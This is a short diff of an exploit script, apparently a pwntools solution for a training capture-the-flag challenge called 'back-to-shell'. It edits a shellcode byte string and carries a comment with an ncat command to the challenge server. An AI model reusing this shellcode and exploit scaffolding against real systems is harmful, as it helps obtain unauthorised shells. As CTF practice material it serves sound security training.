@@ -10,7 +10,7 @@ si
 si
 si
 """
-shellcode = b"\x31\xF6\xC3"
+shellcode = b"\x31\xF6\x31\xD2"
 #ncat --ssl back-to-shell.training.offensivedefensive.it 8080
 if args.GDB:
     p = gdb.debug("./tiny", gdbscript=COMMANDS)
